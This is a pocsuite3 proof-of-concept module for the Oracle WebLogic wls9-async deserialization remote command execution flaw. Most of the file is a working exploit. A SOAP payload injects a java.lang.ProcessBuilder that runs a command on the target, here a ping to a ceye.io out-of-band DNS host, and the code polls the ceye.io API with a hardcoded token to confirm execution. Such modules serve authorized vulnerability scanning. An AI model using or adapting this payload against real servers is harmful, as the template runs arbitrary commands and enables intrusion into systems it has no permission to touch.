"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import re
from collections import OrderedDict
from urllib.parse import urljoin
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict
import json
from pocsuite3.lib.utils import random_str


class WebLogicWlsAsyncRCE(POCBase):
    vulID = '97920'  # ssvid
    version = '3.0'
    author = ['big04dream']
    vulDate = '2019-04-17'
    createDate = '2019-05-09'
    updateDate = '2019-05-09'
    references = ['https://www.seebug.org/vuldb/ssvid-97920']
    name = 'Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞'
    appPowerLink = ''
    appName = 'weblogic'
    appVersion = '10.x, 12.1.3'
    vulType = 'remote code execute'
    desc = '''
        Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def get_check_payload(self, cmd):
        check_payload = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
            <soapenv:Header> 
            <wsa:Action>xx</wsa:Action>
            <wsa:RelatesTo>xx</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
            <void index="0">
            <string>/bin/ping</string>
            </void>
            <void index="1">
            <string>-c</string>
            </void>
            <void index="2">
            <string>{}</string>
            </void>
            </array>
            <void method="start"/></void>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
            <asy:onAsyncDelivery/>
            </soapenv:Body>
        </soapenv:Envelope>
        """.format(cmd)
        return check_payload

    def _verify(self):
        result = {}
        veri_url = urljoin(self.url, '/_async/AsyncResponseService')
        cmd = random_str(16) + '.6eb4yw.ceye.io'
        payload = self.get_check_payload(cmd)
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'Accept-Language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            'Accept-Encoding': "gzip, deflate",
            'Cookie': "sidebar_collapsed=false",
            'Connection': "close",
            'Upgrade-Insecure-Requests': "1",
            'Content-Type': "text/xml",
            'Content-Length': "1001",
            'cache-control': "no-cache"
        }
        try:
            requests.post(veri_url, data=payload, headers=headers)
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(WebLogicWlsAsyncRCE)
